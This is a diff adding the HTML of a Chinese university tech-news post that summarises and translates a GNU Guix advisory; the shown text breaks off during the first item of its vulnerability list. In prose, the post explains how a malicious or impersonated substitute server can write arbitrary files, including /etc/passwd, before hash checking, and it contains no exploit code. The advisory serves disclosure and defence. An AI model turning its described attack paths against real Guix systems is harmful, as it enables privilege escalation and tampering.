@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="山河科技新闻社">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://keji.shanhe.co/2026/07/05/guix-vulnerabilities/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Shanhe University Technology News Portal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="科新文摘#2 | GNU Guix发现四个漏洞">
+<meta property="og:url" content="https://keji.shanhe.co/2026/07/05/guix-vulnerabilities/">
+<meta property="og:site_name" content="山河科技评论 - 计算机学部 - 山河大学">
+<meta property="og:description" content="Shanhe University Technology News Portal">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://keji.shanhe.co/assets/images/opengraph.png">
+<meta property="article:published_time" content="2026-07-05T08:42:30.000Z">
+<meta property="article:modified_time" content="2026-07-05T09:48:33.438Z">
+<meta property="article:author" content="Lycaon Constantine Cayde">
+<meta property="article:tag" content="linux, abstract, gnu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://keji.shanhe.co/assets/images/opengraph.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/assets/images/shanhe-avatar.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/shanhe-avatar.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/assets/images/shanhe-avatar.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            科新文摘#2 | GNU Guix发现四个漏洞 | 山河科技评论
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100...900&display=swap" rel="stylesheet">
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap" rel="stylesheet">
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"keji.shanhe.co","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"tokyo-night-dark"},"font":{"enable":false,"family":"SF Mono Medium","url":"https://db.onlinewebfonts.com/c/4c84f01ded4f950150fc30c12a58b5b1?family=SF+Mono+Medium"}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap"},"english":{"enable":true,"family":"Google Sans","url":"https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap"},"title":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/assets/images/opengraph.png","description":"Shanhe University Technology News Portal"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/assets/images/light.png","dark":"/assets/images/dark.png"},"title":"山河科技评论","subtitle":{"text":["山河大学科技新闻门户"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":"enable","family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100...900&display=swap"},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/arkimium"},{"icon":"fa-brands fa-twitter","url":"https://x.com/arkimium_76"},{"icon":"fa-solid fa-at","url":"net@shanhe.team"},{"icon":"fa-qq","url":3971332031},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"方兴","artist":"铁痕电台-MSR","url":"/assets/music/8.mp3","cover":null,"lrc":null},{"name":"烘炉","artist":"铁痕电台-MSR","url":"/assets/music/6.mp3","cover":null},{"name":"fake face dance music","artist":"音田雅则","url":"/assets/music/12.mp3","cover":null},{"name":"Don't Miss It","artist":"塞壬唱片-MSR","url":"/assets/music/3.mp3","cover":null},{"name":"Your Star","artist":"塞壬唱片-MSR","url":"/assets/music/17.mp3","cover":null},{"name":"Undertopia","artist":"塞壬唱片-MSR","url":"/assets/music/20.mp3","cover":null},{"name":"Speed of Light","artist":"塞壬唱片-MSR","url":"/assets/music/1.mp3","cover":null},{"name":"Everything's Alright","artist":"塞壬唱片-MSR","url":"/assets/music/2.mp3","cover":null},{"name":"Magical Lights","artist":"异环10AM, ELLY.K","url":"/assets/music/15.mp3","cover":null},{"name":"100% Crimson Solver","artist":"异环10AM, Mood & Feel","url":"/assets/music/16.mp3","cover":null},{"name":"漫游打卡进程66%","artist":"异环10AM","url":"/assets/music/14.mp3","cover":null},{"name":"预言 Prophecy","artist":"三Z-STUDIO, HoYo-MiX","url":"/assets/music/22.flac","cover":null},{"name":"WE ARE EMPIRE","artist":"铁痕电台-MSR","url":"/assets/music/22.mp3","cover":null},{"name":"宜","artist":"铁痕电台-MSR, 普阿山, HeartStrings","url":"/assets/music/21.mp3","cover":null},{"name":"Луги","artist":"SadSvit, Do Sliz","url":"/assets/music/17.mp3","cover":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"往期新闻":{"path":"/archives","icon":null},"distroweek#":{"submenus":{"敬请期待":"/"}},"播客":{"submenus":{"敬请期待":"/"}},"关于":{"icon":null,"submenus":{"Me":"/2026/06/30/about/","计算机学部":"https://jsj.shanhe.co"}},"学籍管理":{"path":"https://user.shanhe.co/"},"山河大学官网":{"path":"https://www.shanhe.co/"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2026/07/02 00:00:00","statistics":true,"customize":"山河大学计算机学部主管 山河科技新闻社主办 | 投稿邮箱：net@shanhe.team","icp":{"enable":"enable","number":"鲁ICP备2024104854号","url":"https://beian.miit.gov.cn/"}},"footerStart":"2026/07/02 00:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                山河科技评论
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    
+                                    往期新闻
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    
+                                    DISTROWEEK#
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/">
+                                                    敬请期待
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    
+                                    播客
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/">
+                                                    敬请期待
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/2026/06/30/about/">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://jsj.shanhe.co">
+                                                    计算机学部
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://user.shanhe.co/"
+                                        >
+                                    
+                                    学籍管理
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://www.shanhe.co/"
+                                        >
+                                    
+                                    山河大学官网
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                往期新闻
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-distroweek#"
+                        >
+                            <span>
+                                DISTROWEEK#
+                            </span>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-distroweek#">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/">敬请期待</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-播客"
+                        >
+                            <span>
+                                播客
+                            </span>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-播客">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/">敬请期待</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-关于"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-关于">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/2026/06/30/about/">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://jsj.shanhe.co">计算机学部</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://user.shanhe.co/"
+                        >
+                            <span>
+                                学籍管理
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://www.shanhe.co/"
+                        >
+                            <span>
+                                山河大学官网
+                            </span>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">科新文摘#2 | GNU Guix发现四个漏洞</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/assets/images/shanhe-avatar.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">山河科技新闻社</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-07-05 16:42:30</span>
+        <span class="mobile">2026-07-05 16:42:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-07-05 17:48:33</span>
+            <span class="mobile">2026-07-05 17:48:33</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/linux-abstract-gnu/">linux, abstract, gnu</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h3 id="摘要报道（来自LWN）"><a href="#摘要报道（来自LWN）" class="headerlink" title="摘要报道（来自LWN）"></a>摘要报道（来自LWN）</h3><p>GNU Guix项目宣布<code>guix substitute</code>工具中存在三个漏洞，此外，<code>guix pull</code>和<code>guix time-machine</code>命令也存在一个漏洞。这些漏洞的影响范围很广，从远程权限提升到本地敏感文件泄露都有可能。</p>
+<p>文章指出：</p>
+<div class="callout callout--simple primary mb-4 rounded-small shadow-redefine-flat bg-(--callout-bg-color) p-3 pl-1 relative flex flex-row gap-2 items-center"><div role="none" class="rounded-full self-stretch w-0.5 bg-(--callout-primary-color) shrink-0 opacity-60"></div><div class="callout__content markdown-body flex-1 min-w-0"><p>远程利用<code>guix substitute</code>漏洞只需要易受攻击的系统尝试下载一个二进制替代文件即可。任何已配置的替代服务器，包括使用<code>guix-daemon</code>的<code>--discover</code>选项发现的服务器，都可以利用此漏洞，中间人攻击 (MITM) 也可以利用此漏洞，无论替代服务器URL中是否使用https。</p>
+<p>本地利用<code>guix substitute</code>程序只需要能够连接到<code>guix-daemon</code>的套接字，而默认情况下任何用户都可以做到这一点。</p>
+<p>另外，<code>guix pull</code>和<code>guix time-machine</code>中还发现了另一个安全问题（CVE ID待定），任何能够控制这些命令使用的通道文件的人都可以在运行相关命令的用户有权创建文件的任何位置创建或覆盖该文件。</p></div></div>
+
+<p>项目建议所有用户立即升级<code>guix</code>和<code>guix-daemon</code>。请参阅公告了解具体操作步骤、漏洞测试方法、披露时间表等信息。</p>
+<h3 id="全文（来自GNU-Guix）"><a href="#全文（来自GNU-Guix）" class="headerlink" title="全文（来自GNU Guix）"></a>全文（来自GNU Guix）</h3><p>原题：‘guix substitute’ and ‘guix pull’ Vulnerabilities<br>作者：Caleb Ristvedt — 2026-07-02</p>
+<hr>
+<p><code>guix-daemon</code>调用的辅助工具<code>guix substitute</code>中发现了多个安全漏洞（CVE ID待定），这些漏洞可能导致多种恶意活动，包括远程提升至构建守护进程用户的权限、远程存储损坏，以及可能泄露构建守护进程用户可访问的敏感文件。所有系统均受影响，无论<code>guix-daemon</code>是否以root权限运行；当<code>guix-daemon</code>以非root权限运行时，其危害较小。强烈建议您立即升级守护进程（参见以下说明），并仔细考虑是否在升级时向所有guix命令传递<code>--no-substitutes</code>参数（参见“升级”部分中的注释）。</p>
+<p>远程利用<code>guix substitute</code>漏洞只需易受攻击的系统尝试下载二进制替代文件即可。任何已配置的替代服务器（包括使用<code>guix-daemon</code>的<code>--discover</code>选项发现的服务器）均可利用此漏洞，中间人攻击 (MITM) 也同样可以利用此漏洞，无论替代服务器 URL 中是否使用 https。</p>
+<p>本地利用<code>guix substitute</code>漏洞只需能够连接<code>到guix-daemon</code>的套接字，而默认情况下任何用户都拥有此权限。</p>
+<p>此外，<code>guix pull</code>和<code>guix time-machine</code>中还发现了另一个安全问题（CVE ID待定）。该漏洞允许任何能够控制这些命令所用通道文件的用户，在运行相关命令的用户拥有创建权限的任何位置创建或覆盖文件。无论通道文件是否在沙箱中执行，也无论使用的通道是否仅限于与受信任通道共享引号的通道，此漏洞都可能被利用。由于创建或覆盖的文件内容受到限制，这主要构成拒绝服务攻击风险，但理论上其危害可能更大。</p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>已发现三个影响<code>guix substitute</code>的独立漏洞，第四个漏洞影响<code>guix pull</code>和<code>guix time-machine</code>：</p>
+<ol>
+<li><p>（CVE 编号待定）Guile 代码用于解包替代文件的恢复文件（位于 <code>(guix serialization)</code> 中）并未针对恶意输入进行加固，而是在下载替代文件的同时调用该程序进行提取，而不是等到整个归档文件下载完毕并验证其哈希值后再进行提取。这些因素共同导致任何替代文件服务器（或任何能够冒充服务器的实体）都可以向受影响系统上守护进程用户拥有写入权限的任何位置写入任意文件。如果守护进程以 root 用户身份运行，则包括 &#x2F;etc&#x2F;passwd 文件。<br>为了避免依赖X.509公钥基础设施，用于获取可用替代文件元数据（称为<code>narinfos</code>）的<code>fetch-narinfos</code>程序不会验证服务器证书，因为<code>narinfos</code>的规范部分无论如何都需要签名才能被视为有效。不幸的是，替代文件的URL并非此类规范部分，因此它可以被替换为攻击者控制的URL。如果下载的替代文件与narinfo中的签名哈希值不匹配，则会被拒绝，但为时已晚：替代文件在下载过程中已被提取，因此损害已经造成。<br>这意味着，即使负责实际下载替代文件的<code>download-nar</code>程序本身会验证服务器证书，但在替代服务器URL中使用https也无法限制攻击者，因为证书只需适用于攻击者控制的URL即可。<br><code>restore-file</code>也被其他工具使用，包括<code>guix offload</code>、<code>guix archive --extract</code>和<code>guix challenge</code>。如果向这些工具提供不可信的输入，它们都可能以相同的方式被利用。</p>
+</li>
